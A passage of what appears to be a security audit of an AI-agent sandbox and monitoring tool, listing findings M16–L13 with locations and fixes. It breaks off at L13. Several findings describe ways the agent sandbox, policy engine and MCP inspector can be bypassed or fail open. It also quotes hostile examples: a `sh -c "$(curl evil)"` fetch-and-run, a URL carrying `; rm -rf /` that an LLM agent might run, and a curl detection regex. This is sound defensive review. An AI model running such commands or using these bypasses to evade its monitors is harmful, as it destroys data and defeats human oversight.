### M16. Score 6 — `http.Server.WriteTimeout` (default 5m) forcibly terminates SSE handlers
- **Where:** `internal/server/server.go` (`New: WriteTimeout` default `"5m"`), `internal/api/app.go` (`streamEvents`), `exec_stream.go` (`execInSessionStream`)
- **Issue:** `WriteTimeout` is the absolute write deadline including a long-lived stream. The 5m default caps indefinite event tails and any streaming exec near the 5m command timeout.
- **Fix:** For SSE/streaming routes set `WriteTimeout=0` (rely on `ReadHeaderTimeout` + per-handler context), or move streaming handlers to a separate `*http.Server` without `WriteTimeout`.

### M17. Score 6 — DNS proxy unbounded goroutine-per-query (DoS)
- **Where:** `internal/ptrace/dns_proxy.go:81-97` (`listenUDP` spawns `go p.handleQuery` per packet)
- **Issue:** Every UDP datagram spawns a goroutine with no concurrency limit; each `handleQuery`→`forwardQuery` does `net.Dial`+`Read` (2s deadline). A tracee flooding `127.0.0.1:53` creates thousands of live goroutines, each holding a socket.
- **Fix:** Bound concurrent in-flight queries with a semaphore/worker pool; drop/`SERVFAIL` excess.

### M18. Score 6 — Unbounded growth of `fdTracker.ipToDomain` and `ProcessTree`
- **Where:** `internal/ptrace/fd_tracker.go` (`recordDNSResolution` adds to `ipToDomain`; `clearTGID` doesn't clear it), `internal/ptrace/process_tree.go` (`Remove` never called by `handleExit`)
- **Fix:** Evict `ipToDomain` entries on `clearTGID`; cap the map (LRU); call `processTree.Remove(tgid)` from `handleExit` when the last thread exits.

### M19. Score 6 — TOCTOU between entry-time path resolution and syscall execution
- **Where:** `internal/ptrace/handle_file.go` (`resolvePath`/`resolvePathNoFollow` at entry), `internal/ptrace/redirect_file.go` (`softDeleteFile`/`redirectFile` inject after `advancePastEntry`), `internal/ptrace/tracer.go` (`handleOpenatExit` re-verifies *only* openat/openat2)
- **Issue:** Path policy evaluated at syscall-entry using `/proc/<tid>/root`; other threads of the same process aren't stopped, so a concurrent thread can swap a symlink/rename between entry resolution and kernel execution. Exit-time re-verification exists only for `openat`/`openat2`; `unlinkat`, `renameat2`, `linkat`, `symlinkat`, `fchmodat`, `fchownat`, and legacy file syscalls have none. `softDeleteFile` injects `renameat2` using a stale resolved `absPath`.
- **Fix:** Extend exit-time path re-verification to all mutating file syscalls, or check+execute atomically under a mechanism stopping the whole TGID (e.g. seccomp-notify `SECCOMP_USER_NOTIF_FLAG_CONTINUE` after verification).

### M20. Score 6 — LLM-path header sanitizer redacts only 3 headers
- **Where:** `internal/proxy/proxy.go` (`sanitizeHeaders` redacts only `Authorization`, `X-Api-Key`, `Api-Key`) vs `internal/proxy/declared_service.go` (`sanitizeHeadersForDeclaredService` also redacts `Cookie`, `Set-Cookie`, `Proxy-Authorization`, `Proxy-Authenticate`, + injected header names)
- **Issue:** The LLM request/response log path persists `Cookie`, `Set-Cookie`, `Proxy-Authorization`, and any header injected by a global `HeaderInjectionHook` verbatim (the LLM path doesn't consult `InjectedHeaderNamesForService`).
- **Impact:** Session tokens / proxy creds / injected secrets written to `llm-requests.jsonl` (0600) in plaintext.
- **Fix:** Reuse `sanitizeHeadersForDeclaredService` (with `InjectedHeaderNamesForService("")`) on the LLM path.

### M21. Score 6 — `ProcessFilter.resolveHost` does system reverse DNS (bypasses interceptor); unbounded cache; goroutine leak on timeout
- **Where:** `internal/netmonitor/ebpf/process_filter.go` (`resolveHost`)
- **Issue:** Per-connection reverse DNS goes to the OS resolver (not the agent's DNS), cached forever in an unbounded map, and on `ctx.Done()` the in-flight `net.LookupAddr` goroutine isn't cancelled.
- **Fix:** Use the agent's DNS cache for reverse lookups; bound + TTL the caches; cancel the resolver via a cancellable context.

### M22. Score 6 — Non-atomic BPF map reload window in `PopulateAllowlist`
- **Where:** `internal/netmonitor/ebpf/maps_linux.go` (`PopulateAllowlist`)
- **Issue:** Deletes cgroup entries, re-inserts, sets `default_deny` last. For a default-**allow** cgroup being reconfigured to deny, `default_deny` retains its old `0` until the very end → connections mid-reload are allowed that should be denied (fail-open window).
- **Fix:** Set `default_deny` first (to the new value) before mutating allow/deny entries, or rebuild into a separate map and swap atomically.

### M23. Score 6 — darwin `cpu_monitor` uint64 underflow on PID reuse → SIGSTOP unrelated process
- **Where:** `internal/platform/darwin/cpu_monitor.go` (`checkAndThrottle`/`throttle`)
- **Issue:** `cpuDelta := currentCPUTime - m.lastCPUTime` (both uint64). `processAlive()` only checks PID exists; if the original died and the PID was reused, the new process has lower CPU time → underflow → huge `cpuPercent` → `Kill(pid, SIGSTOP)` throttles an unrelated process.
- **Fix:** Validate process identity (start time / name) before throttling; use signed/int64 deltas clamped to 0; stop the monitor when the original exits.

### M24. Score 6 — darwin `fsevents` blocking channel send → goroutine leak
- **Where:** `internal/platform/darwin/fsevents.go` (`eventLoop`/`handleEvent`)
- **Issue:** `handleEvent` does a blocking `m.eventChan <- ev` with no `select` on `ctx.Done()`/`stopCh`. `Stop()` closes `stopCh`/`watcher.Close()`, but if blocked in the send it never checks them.
- **Fix:** `select { case eventChan <- ev: case <-stopCh: case <-ctx.Done(): }` (and/or buffered drop path).

### M25. Score 6 — darwin policysock auth is a no-op in nocgo builds; `chmod 0666`; skips code-signing for root
- **Where:** `internal/platform/darwin/policysock/auth_nocgo.go`, `policysock/server.go` (`Run`)
- **Issue:** `ValidatePeer` is a no-op when CGO disabled. Even with CGO, `Run` only calls `ValidatePeer` if `s.teamID != ""`, the socket is `chmod 0666`, and `ValidatePeer` skips code-signing for root peers (UID 0) when `LOCAL_PEERPID` unavailable.
- **Impact:** In nocgo builds, or when `teamID` isn't set, any local process can connect and issue `register_session`/`fetch_policy_snapshot`/`pnacl_*` commands.
- **Fix:** Require `teamID` (fail closed if unset); make `ValidatePeer` non-empty in nocgo (deny by default); don't skip code-signing for root peers.

### M26. Score 6 — darwin policysock `handleConn`/`handleEventStream` block on `Decode` → shutdown hang
- **Where:** `internal/platform/darwin/policysock/server.go` (`handleConn`, `handleEventStream`)
- **Issue:** Both loop on `decoder.Decode(...)` which blocks until the peer sends data/disconnects. On `ctx.Done()` the listener is closed but existing connections aren't; `Run` calls `s.wg.Wait()` after the accept loop exits.
- **Fix:** Track live conns and close them on `ctx.Done()`, or set read deadlines driven by `ctx` so `Decode` unblocks.

### M27. Score 6 — Windows network interception: WFP is a stub; WinDivert captures all host traffic; fail-open
- **Where:** `internal/platform/windows/network.go` (`setupWFP`/`AddBlockRule`/`AddAllowRule`), `windows/windivert_windows.go` (`processPacket`)
- **Issue:** `setupWFP` returns nil without adding rules (stub), yet `configured=true`; `AddBlockRule`/`AddAllowRule` no-ops. WinDivert's filter captures all outbound TCP/DNS system-wide and redirects all of it (PID unavailable in WinDivert 1.x). `failMode` defaults to `FailModeOpen` and `consecutiveFailures` never resets.
- **Fix:** Mark WFP unavailable until implemented; gate WinDivert redirect on session PID matching; reset failure counter on success; consider fail-closed.

### M28. Score 6 — Sandbox `Execute` leaks `os.Environ()` + no private mounts (weak isolation)
- **Where:** `internal/platform/linux/sandbox.go` (`Execute`/`buildSysProcAttr`), `darwin/sandbox_resources.go`, `windows/sandbox.go` (`executeUnsandboxed`), `windows/appcontainer.go` (`mergeWithParentEnv`)
- **Issue:** Linux sets `Cloneflags = CLONE_NEWNS|...` but never makes mounts private or bind-mounts the workspace → child sees the host filesystem; `execCmd.Env = os.Environ() + config.Environment` leaks the full host environment.
- **Fix:** Set up a private mount tree with bind mounts for allowed paths; construct a minimal environment rather than inheriting `os.Environ()`.

### M29. Score 6 — Windows sandbox `Create` silently falls back to unsandboxed execution
- **Where:** `internal/platform/windows/sandbox.go` (`Create`)
- **Issue:** If `container.create()` fails and `FailOnAppContainerError==false`, execution falls through to `executeUnsandboxed` (full host access). Minifilter `client.Connect()` failure is ignored ("continuing without policy enforcement"); both log only via TODO comments.
- **Fix:** Default fail-closed; when falling back, return a distinct error or degraded-capability marker rather than an apparently-healthy sandbox.

### M30. Score 6 — darwin policysock `LatestSession` returns a random session; cleanup leaks
- **Where:** `internal/platform/darwin/policysock/sessions.go` (`LatestSession`, `UnregisterSession`/`UnregisterProcess`)
- **Issue:** `LatestSession` iterates `sessionRootPID` (a Go map, randomized order) and returns whatever it lands on — not "latest". `UnregisterSession` looks up `pidToSession[rootPID]`; if already removed, returns without `EndSession`, and `sessionRootPID` is never cleaned except via `EndSession`.
- **Impact:** `BuildPolicySnapshot` with an empty `sessionID` applies a random session's rules (cross-session policy leak); sessions leak state.
- **Fix:** Track insertion order for `LatestSession`; clean `sessionRootPID` in `UnregisterProcess`; make `UnregisterSession` robust to an already-removed root PID.

### M31. Score 6 — Audit KMS encrypted-DEK non-atomic write → silent integrity-key rotation
- **Where:** `internal/audit/kms/aws.go` (~75), `internal/audit/kms/gcp.go` (~75) (`GetKey` encrypted-DEK caching)
- **Issue:** Encrypted DEK written with `os.WriteFile(p.encryptedDEKFile, encryptedKey, 0600)` — non-atomic, no `fsync`, no dir sync. On restart, if present-but-truncated (crash mid-write), `decryptDEK` fails → falls through to `generateDEK` → brand-new HMAC key.
- **Impact:** A crash during the initial DEK write silently rotates the integrity key; the chain can no longer verify prior entries (HMAC mismatch); old encrypted audit blobs unverifiable. Tamper-evidence hazard.
- **Fix:** Write via temp-file + `Sync` + atomic `rename` + dir `fsync` (the `audit` package has `replaceFile`/`syncDir` helpers); treat a decrypt failure as fatal, not regenerate.

### M32. Score 6 — `trash.Divert` token collision → lost entries
- **Where:** `internal/trash/trash.go` (`Divert` ~80)
- **Issue:** `token := fmt.Sprintf("%d", time.Now().UnixNano())`. On rapid successive deletes within the same nanosecond (coarser on Windows), two diversions share a token → same `TrashPath` and `manifest/<token>.json`, so the second overwrites the first manifest and one payload is orphaned/lost.
- **Fix:** Append a `crypto/rand` suffix, or use a monotonic counter (mirror `audit.generateAuditID`).

### M33. Score 6 — `events` factory aliases default maps/slices across all events
- **Where:** `internal/events/factory.go` (`NewEvent` ~75)
- **Issue:** Every `BaseEvent` initialized with `Metadata: f.config.DefaultMetadata`, `Tags: f.config.DefaultTags`, `Labels: f.config.DefaultLabels` — same map/slice headers aliased across all events.
- **Impact:** Any consumer that mutates `event.Metadata[k]`/appends `Tags`/writes `Labels` corrupts the shared defaults and every past/future event.
- **Fix:** Copy the maps/slices per event (`maps.Clone`).

### M34. Score 6 — `hotreload.Stop` doesn't cancel the start context → goroutine leak
- **Where:** `pkg/hotreload/watcher.go` (`Stop` ~320, `processReloads`/`processStagingReloads`)
- **Issue:** `Stop()` flips `running=false` + closes the fsnotify watcher (ends `processEvents`), but `processReloads`/`processStagingReloads` only exit on `<-ctx.Done()`; `Stop` doesn't cancel the context passed to `Start`.
- **Fix:** Have `Start` spawn goroutines that also select on a `Stop`-driven internal `done` channel (close it in `Stop`), or require the start context be cancelled before `Stop`.

### M35. Score 6 — `breakglass.Status`/`IsActive` doesn't latch; `RecordOperation` logs after expiry
- **Where:** `pkg/emergency/breakglass.go` (`Status` ~150, `RecordOperation` ~200, `autoExpire`)
- **Issue:** `IsActive()`/`Status()` check `time.Now().After(ExpiresAt)` and return `Active:false` but never write `b.state.Active=false`. `RecordOperation` only checks `b.state.Active` (not expiry), so after expiry — and forever if `AutoExpire==false` — it still increments `Operations` and calls `LogBreakGlassOperation`, even though `ShouldBypass` already returns false.
- **Impact:** Audit trail inconsistent; operations logged as break-glass after the bypass expired; count grows unbounded with `AutoExpire=false`.
- **Fix:** On expiry detection latch `b.state.Active=false` under the lock; have `RecordOperation` re-check expiry.

### M36. Score 6 — `config show` prints webhook/OTEL headers (secrets) to stdout
- **Where:** `internal/cli/config_cmd.go` (`config show`), `internal/config/config.go`
- **Issue:** `printJSON(cmd, cfg)` marshals the entire resolved `*config.Config`, including `Audit.Webhook.Headers` and `Audit.OTEL.Headers` (`map[string]string`, commonly `Authorization: Bearer <token>` / `X-API-Key: <secret>`).
- **Fix:** Redact `headers` map values (or known sensitive keys) before marshaling; implement a `MarshalJSON`/redactor.

### M37. Score 6 — Vault provider: unescaped path in URL + global `*` allowlist reaches sys endpoints
- **Where:** `pkg/secrets/vault.go` (`Get`/`List` ~55-110), `pkg/secrets/manager.go` (`isPathAllowed` ~418)
- **Issue:** URL built as `fmt.Sprintf("%s/v1/%s", address, path)` with agent-controlled `path` unescaped; `isPathAllowed` with global `allowed_paths: ["*"]` permits any path including `sys/...` and `auth/token/lookup-self`. `matchPath` only does exact/prefix-`*`.
- **Fix:** URL-escape path segments; reject `..`/`sys`/`auth` targets; prefer explicit KV path prefixes over global `*`.

### M38. Score 6 — TOCTOU between binary hash and exec defeats MCP binary pinning
- **Where:** `internal/shim/binary_hash.go:28-33` (`HashBinary`), `internal/shim/mcp_exec.go:60` (`verifyBinaryPin`), `:188-192` (`WrapCommand` sets `cmd.Path`)
- **Issue:** Pin verification hashes the file content at `absPath` at verify time; `WrapCommand` later execs the same path. Between `io.Copy(h, f)` and `cmd.Start()`, the binary at that path can be replaced.
- **Fix:** Hash the opened `*os.File` fd and pass that fd as the child's executable (e.g. `/proc/self/fd/N`), or re-stat+re-hash immediately before exec and compare.

### M39. Score 6 — `WrapCommand` cleanup can hang forever on `wg.Wait()`
- **Where:** `internal/shim/mcp_exec.go:228-235` (stdin goroutine), `:258-262` (cleanup)
- **Issue:** The stdin inspection goroutine runs `ForwardWithInspection(origStdin, stdinWriter, …)` where `origStdin` defaults to `os.Stdin`. `cleanup` closes `stdinReader`/`stdoutWriter` but never `origStdin`/`stdinWriter`; the goroutine only exits when `origStdin` EOFs. If `origStdin` is a TTY/pipe that stays open, the goroutine stays blocked and `wg.Wait()` never returns.
- **Fix:** `cleanup` should close `stdinWriter` (causing the goroutine's next write to fail) and/or select on a done-channel. `[needs verification: caller may close origStdin first]`

### M40. Score 6 — MCP `tools/call` requests never blocked by the shim inspector
- **Where:** `internal/mcpinspect/inspector.go` (`handleToolsCall` returns `nil`; `Inspect` returns `(nil,nil)`), `internal/shim/mcp_bridge.go:30-33`
- **Issue:** For `tools/call`, `Inspect` returns no `InspectResult` → `MCPBridge.Inspect` returns `false` (forward). `CheckPolicy`/`CheckRateLimit` exist but aren't invoked in the `Inspect` path; the shim wires no policy. Argument scanning is "alert-only, never blocks." A denylisted/pin-mismatched tool still executes; only its response may be blocked (after side effects).
- **Fix:** If the shim is an enforcement point, call `CheckPolicy`/`CheckRateLimit`/`SessionAnalyzer.CheckAndRecord` in `handleToolsCall` and return `Action:"block"` when denied; otherwise document the shim as audit-only.

### M41. Score 6 — `AttachPID` blocks forever on full `attachQueue` (no timeout/backpressure)
- **Where:** `internal/ptrace/tracer.go:318-327` (`t.attachQueue <- …`), `:330-343` (`WaitAttached` 10s timeout moot if send never returns)
- **Issue:** `AttachPID` performs an unbuffered-blocking send to `attachQueue` (cap 64) before registering for `WaitAttached`. If the Run loop is wedged or 64 attaches pending, the calling goroutine blocks indefinitely. `ResumePID` same.
- **Fix:** Use a non-blocking `select`+`default` returning an error, or a context/timeout on the enqueue.

### M42. Score 6 — `handleNetwork` sendto DNS-redirect TOCTOU / fail-open on undersized sockaddr
- **Where:** `internal/ptrace/handle_network.go:44-78` (sendto redirect), `internal/ptrace/redirect_net.go:36-120` (`redirectConnect`)
- **Issue:** The DNS redirect reads the sockaddr from tracee memory, rewrites it, writes it back in place — a concurrent sibling thread can alter the buffer between the tracer's `writeBytes` and the kernel's copy-from-user (classic ptrace memory TOCTOU). When `addrLen < 16/28`, the connect-redirect path **allows** the original syscall rather than denying.
- **Fix:** Fail-closed (deny) on undersized sockaddr; copy to a scratch page and rewrite the pointer rather than mutating in place.

### M43. Score 5 — Privileged policy IPC socket at hardcoded `/tmp` path
- **Where:** `internal/config/config.go` (~1985: `cfg.PolicySocket.Path` default `"/tmp/agentmon-policy.sock"`; `TeamID` hardcoded `"LWSYS6YTUZ"`)
- **Issue:** Violates AGENTS.md (use `os.TempDir()`); classic `/tmp` symlink/socket-hijack on a privileged IPC channel.
- **Fix:** Place the socket in a protected per-service runtime dir; create with `O_EXCL`; verify ownership/perms on bind.

### M44. Score 5 — `agentmon-rlimit-exec` memory cap is bypassable
- **Where:** `cmd/agentmon-rlimit-exec/main.go` (`rlimit := unix.Rlimit{Cur: limit, Max: current.Max}` then `Setrlimit`)
- **Issue:** Only the **soft** limit is lowered; the hard limit is preserved (commonly `RLIM_INFINITY`). An unprivileged child can raise its own soft limit back to the hard limit, so `RLIMIT_AS` provides no real containment.
- **Fix:** Lower the hard limit too (privileged helper / cgroups / Job Objects), or document that `RLIMIT_AS` here is advisory only.

### M45. Score 5 — `pnacl-monitor` builds ACL config path from unvalidated `SUDO_USER`/`HOME` as root
- **Where:** `cmd/pnacl-monitor/main.go` (`configPath = os.Getenv("HOME") + "/.config/…"` and `"/home/" + sudoUser + "/.config/agentmon/network-acl.yml"`)
- **Issue:** Root process loads its network-ACL policy from a path derived from caller-set env. A spoofed `SUDO_USER` (e.g. `../../tmp/x`) redirects policy loading to an attacker-controlled YAML while running as root with eBPF. Also violates AGENTS.md (string-concat paths, hardcoded `/home/`).
- **Fix:** Resolve the config path from a root-owned location or validate `SUDO_USER` against `/etc/passwd`; use `filepath.Join`.

### M46. Score 5 — Seccomp default action is "allow" (fail-open blocklist)
- **Where:** `internal/config/config.go` (~1180: `Sandbox.Seccomp.Syscalls.DefaultAction` default `"allow"`)
- **Issue:** Only explicitly-listed `Block` syscalls are blocked; unknown/new syscalls pass by default — weaker than an allowlist posture.
- **Fix:** Offer/encourage a default-deny syscall policy for high-security modes.

### M47. Score 5 — Policy signing defaults to "off"
- **Where:** `internal/config/config.go` (`SigningConfig.SigningMode`)
- **Issue:** Policy signature verification defaults to `"off"`; `LoadFromBytes` parses policies with no integrity check.
- **Impact:** Anyone who can write the policy directory can silently alter agent restrictions.
- **Fix:** Default to `"warn"` (or `"enforce"` in production), requiring a trust store.

### M48. Score 5 — Opaque `sh -c` bypass for allow-only policies without execve enforcement
- **Where:** `internal/policy/engine.go` (`checkCommand`, `hasRestrictiveCommandRule` gate ~300-340)
- **Issue:** The opaque-shell-c deny only fires when `hasRestrictiveCommandRule` is true. Policies with **only `allow` rules** (common) run opaque scripts unchecked; with no execve enforcement, `sh` (allowed) + `sh -c "$(curl evil)"` executes unseen.
- **Fix:** Treat "shell interpreter allowed but unparsable payload" as a risk regardless of rule strictness, or require explicit opt-in to run opaque scripts.

### M49. Score 5 — Env policy defaults to allow-all except a hardcoded blocklist
- **Where:** `internal/policy/engine.go` (`CheckEnv` ~710), `internal/policy/env_policy.go` (`defaultSecretDeny`)
- **Issue:** With no `env_policy.allow` list, every env var is allowed except the hardcoded `defaultSecretDeny` set. Custom secret-bearing vars (`MY_DB_PASSWORD`, `CUSTOM_API_KEY`) pass through.
- **Fix:** Default deny-by-default for env (require allowlist), or expand default-secret detection to patterns (`*SECRET*`, `*TOKEN*`, `*PASSWORD*`, `*KEY*`).

### M50. Score 5 — `policygen` treats nil-Policy events as allowed; bakes shadow-mode allows into policy
- **Where:** `internal/policygen/generator.go` (`getDecision` ~230)
- **Issue:** `if ev.Policy == nil { return DecisionAllow }`; reads `EffectiveDecision` (which for a shadow-mode `approve` rule is `Allow`); generated rules use `filepath.Base(cmd)` (e.g. `bash`) as the allowed command.
- **Fix:** Treat nil-Policy events as unknown (skip, not allow); generate interpreter rules with arg constraints, not bare basename allows.

### M51. Score 5 — `DomainRateLimiter.domains` and `CorrelationMap.ipToHostname` grow unbounded
- **Where:** `internal/netmonitor/ratelimit.go` (`getDomainLimiter`), `internal/netmonitor/redirect/correlation.go` (`AddResolution`, `ipToHostname`)
- **Issue:** `d.domains` keyed by domain with no cap/TTL; `Reset()` not called on reload/hot path. `AddResolution` overwrites `ipToHostname[ip]` without removing the prior hostname's reverse entry; stale entries persist until `Cleanup()` (which may not be scheduled); `ipToHostname` grows unbounded.
- **Fix:** Cap the map (LRU) or reuse a per-wildcard limiter set; on `AddResolution` remove the IP from the previous hostname's reverse entry; schedule periodic `Cleanup()`.

### M52. Score 5 — `execPTYWS` `resp.Body` not closed on error (FD leak)
- **Where:** `internal/cli/exec_pty.go` (`execPTYWS`, `dialer.DialContext` block)
- **Issue:** On `err != nil`, both branches (`errPTYSessionNotFound` for 404 and `return err`) leave `resp.Body` unclosed (gorilla/websocket requires the caller to close the handshake body on failure). Hit up to twice via the auto-start retry.
- **Fix:** `if resp != nil { _ = resp.Body.Close() }` before returning in the error branch.

### M53. Score 5 — checkpoint `--storage-dir` ignores its documented config default
- **Where:** `internal/cli/checkpoint.go` (`getCheckpointStorage`)
- **Issue:** Flag help advertises "default: config sessions.checkpoints.storage_dir", but the implementation is `if dir == "" { dir = "/var/lib/agentmon/checkpoints" }` and never calls `loadLocalConfig` to read `cfg.Sessions.Checkpoints.StorageDir`.
- **Impact:** A non-default `storage_dir` → CLI `checkpoint list/show/rollback/purge` look in the wrong directory and report "no checkpoints found"; CLI/server views diverge.
- **Fix:** Load local config and fall back to `cfg.Sessions.Checkpoints.StorageDir` before the hardcoded default.

### M54. Score 5 — TLS leaf cache never checks expiry
- **Where:** `internal/db/tlsleaf/leaf.go` (`IssueLeaf` returns `c.cache.get(hostname)` with no `NotAfter` check)
- **Issue:** Leaves issued with `NotAfter = now + 90d` and cached indefinitely by hostname; `IssueLeaf` returns the cached cert without verifying validity; no refresh path.
- **Impact:** After ~90 days uptime, new client TLS handshakes fail with an expired cert (availability outage); requires a proxy restart.
- **Fix:** Re-issue when the cached leaf is within a refresh window of expiry (e.g. `now > NotAfter - 7d`).

### M55. Score 5 — Cancel-mapping table exhausted by connection churn
- **Where:** `internal/db/proxy/postgres/cancelmap.go` (`Register` returns `errBackendKeyTableFull` when `len(entries) >= max` after pruning)
- **Issue:** Disconnected entries retained for `graceWindow` (5 min). With `max=100k`, sustained churn (~333 conn/s) fills the table; new connections fail at the `BackendKeyData` step and drop with `53300`. Only expired entries pruned — no eviction of oldest disconnected under pressure.
- **Fix:** When full, evict the oldest disconnected entry beyond a smaller hard floor (or cap disconnected entries separately).

### M56. Score 5 — `Allowlist.Add` allowlists packages that were never successfully scanned
- **Where:** `internal/pkgcheck/checker.go:106-111` (step 7), `internal/pkgcheck/allowlist.go:30-35`
- **Issue:** Step 7 calls `Allowlist.Add(registry, pkg.Name, pkg.Version)` for every package whenever the verdict is `allow`/`warn`, including when a provider failed with `OnFailure="allow"` (no finding, no error — see C4) or where a package was skipped by privacy filtering. Compounds C4 into a durable bypass.
- **Fix:** Only `Add` when all configured providers returned a non-partial success for that package. `[needs verification: IsAllowed call-site]`

### M57. Score 5 — Generated macOS/Windows shim scripts interpolate `AgentmonBinary` unquoted
- **Where:** `internal/shim/install_darwin.go:66-88` (`exec %s shim-exec …`), `internal/shim/install_windows.go`
- **Issue:** `cfg.AgentmonBinary` interpolated via `fmt.Sprintf("%s",…)` into a shell/batch script body (mode 0755) with no quoting. A path with spaces breaks the `exec` line; shell metacharacters (`;`, backtick, `$()`) enable command injection into the installed shim file.
- **Fix:** Quote the path safely (single-quoted form) or pass via an env var read with proper quoting.

### M58. Score 5 — Wrappers leak the security-policy env to the sandboxed command via `syscall.Exec(..., os.Environ())`
- **Where:** `cmd/agentmon-unixwrap/main.go` (final `syscall.Exec`), `cmd/agentmon-macwrap/main.go` (`syscall.Exec(cmd, args, os.Environ())`)
- **Issue:** `AGENTMON_SECCOMP_CONFIG`/`AGENTMON_SANDBOX_CONFIG` (full sandbox policy + fd-layout env) passed through to the wrapped command. Only `AGENTMON_WRAPPER_LOG_FD` is unset.
- **Impact:** A sandboxed process reads its own env to enumerate the exact security policy + fd layout, aiding evasion.
- **Fix:** Scrub agentmon-internal env vars before `syscall.Exec` (the logging path already shows the pattern).

---

## LOW / HARDENING

### L1. Score 4 — `agentmon-unixwrap` relies on `defer Close()` across `syscall.Exec` (defers never run)
- **Where:** `cmd/agentmon-unixwrap/main.go` (`defer filt.Close()`, `defer sigFilter.Close()` then `syscall.Exec`)
- **Issue:** `syscall.Exec` replaces the process image without running deferred functions; the seccomp notify fd (`filt.NotifFD()`) and signal fd are only `defer`-closed. Cleanup depends entirely on `FD_CLOEXEC` being set.
- **Impact:** If either fd lacks CLOEXEC, the sandboxed command inherits the seccomp notify fd and could `SECCOMP_IOCTL_NOTIF_SEND_RESP` on its own trapped syscalls — direct policy bypass.
- **Fix:** Explicitly close/dup-with-CLOEXEC the notify+signal fds before `syscall.Exec`; assert CLOEXEC in the filter setup.

### L2. Score 4 — `execStream`/`events` SSE scanner 64KB limit truncates large chunks
- **Where:** `internal/cli/exec.go` (`execStream`), `internal/cli/events.go` (`newEventsTailCmd`)
- **Issue:** `bufio.NewScanner(body)` default 64KB max token; a `data:` SSE line carrying >64KB makes `Scan()` return false / `ErrTooLong`. (`llm_logs.go` correctly calls `sc.Buffer(...,1<<20)`.)
- **Fix:** Raise the scanner buffer like `llm_logs.go`, or read with `bufio.Reader` line-by-line.

### L3. Score 4 — `shellSubstitutions` prints an unquoted URL (prompt-injection-to-shell)
- **Where:** `internal/cli/exec.go` (`shellSubstitutions`)
- **Issue:** For blocked `curl` calls it prints `agentmon: try: wget -qO- <url>` where `<url>` is verbatim from `resp.Request.Args`, no quoting/escaping. A URL with shell metacharacters (`http://x; rm -rf /`) yields an executable shell string an LLM agent may copy-paste/execute.
- **Fix:** Shell-quote the URL (`%q`/`shellescape`) or print the URL as data, not a runnable command.

### L4. Score 4 — `AGENTMON_IN_SESSION=1` is an env-controlled fail-open
- **Where:** `cmd/agentmon-shell-shim/main.go` (`if inSession == "1" { runAndExit(inSessShell, …) }`)
- **Issue:** The recursion guard is caller-settable; relies on the kernel-install (seccomp) branch running first, but if `shim_install=off` (or bare interactive shell where the kernel branch is skipped), a user who sets `AGENTMON_IN_SESSION=1` execs the real shell with no enforcement.
- **Fix:** Only honor `AGENTMON_IN_SESSION` when set by a trusted parent (sealed/signed channel), not raw env.

### L5. Score 4 — Unsigned on-disk caches allow poisoning + stale "clean" entries
- **Where:** `internal/pkgcheck/cache/cache.go:62-75,118-140`, `internal/skillcheck/cache/cache.go:42-62`
- **Issue:** Both load JSON verbatim with no integrity check (0600 limits but doesn't eliminate risk). A "clean" entry cached for `CleanTTL` (default 24h) returns a stale allow during a registry yank-and-republish or a skills.sh status change; `skillcheck` cache key is content-SHA so external reputation changes are masked until TTL.
- **Fix:** Bind cache entries to a content+reputation version, or re-validate with a short freshness probe; consider a MAC if the cache dir is shared.

### L6. Score 4 — `skillcheck` orchestrator misses partial-with-findings failures
- **Where:** `internal/skillcheck/orchestrator.go:79-86`
- **Issue:** Records a `ProviderError` only when `err != nil` or (`Metadata.Error != "" && len(resp.Findings)==0`). The Snyk subprocess provider returns `(resp with findings + Metadata.Error, nil)` on partial failure with some findings — records no error, so `actionFloorFromProviderErrors` isn't applied and failed sub-checks are silently dropped.
- **Fix:** Record a `ProviderError` whenever `resp.Metadata.Partial` or `Metadata.Error != ""`, regardless of finding count.

### L7. Score 4 — `recvNotifyFD` has no deadline/context (relay hang)
- **Where:** `internal/shim/kernelinstall/install_linux.go` (`runRelay` → `recvNotifyFD(parentFile)`)
- **Issue:** `unix.Recvmsg` on `parentFile` blocks indefinitely if the wrapper starts but neither sends the fd nor exits. No `SetReadDeadline`/context wired.
- **Fix:** Set a read deadline on the socketpair parent end, or run the recv in a goroutine and select on a context/`waitWrapper` timeout.

### L8. Score 4 — `mcpinspect` detector regex ReDoS + recursive schema walk
- **Where:** `internal/mcpinspect/detector.go:55-62` (`inspectText`), `provider/local.go` (`reBase64Blob`), `detector.go:78-95` (`inspectSchemaNode`)
- **Issue:** MCP lines up to 1 MiB; several unanchored regexes with quantifiers (`base64.*\|.*curl`, `[A-Za-z0-9+/]{1000,}`) can exhibit catastrophic backtracking, stalling the inspection goroutine (blocking the MCP stream). `inspectSchemaNode` recursion depth = JSON nesting (bounded by `encoding/json`'s 10000 — still a stack-overflow risk).
- **Fix:** Anchor regexes / substring prefilter; cap recursion depth in `inspectSchemaNode`.

### L9. Score 4 — `ratelimit` quota maps unbounded (OOM over long runs)
- **Where:** `pkg/ratelimit/quota.go` (`GetSessionLimiter` ~96, `GetQuota` ~213)
- **Issue:** `limiters`/`quotas` keyed by `session:<id>:<resource>`; entries never evicted; sessions created/destroyed continuously.
- **Fix:** Add `Release(sessionID)`/cleanup on session end, or a TTL/size-bounded cache.

### L10. Score 4 — `events.broker.Publish` drops on full buffer, silent
- **Where:** `internal/events/broker.go` (`Publish` ~42)
- **Issue:** Non-blocking `select/default` drop on full buffer, logging only every 100th drop (to stderr). No backpressure, no alerting hook beyond a `dropped` counter.
- **Impact:** For a security/audit product, a slow consumer silently loses audit events; only signal is a counter read by an operator polling `/metrics`.
- **Fix:** Configurable drop policy (block-with-timeout vs drop) + structured warn/metric per drop burst; consider a dead-letter sink for audit-critical types.

### L11. Score 4 — metrics `wtp_ratelimit` test-reset data race
- **Where:** `internal/metrics/wtp_ratelimit.go` (`ResetClassifierBypassLimiterForTest` ~40)
- **Issue:** `metricsClassifierBypassLimiter`/`receiverClassifierBypassLimiter` are plain package vars; `AllowMetricsClassifierBypassWARN()` reads `var.Allow()` while the reset reassigns the var with no synchronization.
- **Fix:** Store behind `atomic.Pointer[*rate.Limiter]` (or a mutex) and `Store`/`Load`.

### L12. Score 4 — `killswitch.Activate` CAS before lock; `Reset` nil-deref risk
- **Where:** `pkg/emergency/killswitch.go` (`Activate` ~73, `Reset`)
- **Issue:** `activated.CompareAndSwap(false,true)` runs before `k.mu.Lock()`; kill sessions/`sessionMgr.Disable()`/`k.state` assignment happen after. `Reset` does `k.state.Activated = false` without a nil check. If `Activate` errors/panics after the CAS, `activated` stays true while `k.state` is nil → `Reset` panics.
- **Fix:** Acquire `k.mu` first, then CAS, roll back `activated` on failure; nil-check `k.state` in `Reset`.

### L13. Score 4 — `report/markdown` no escaping; `formatNumber` mishandles negatives
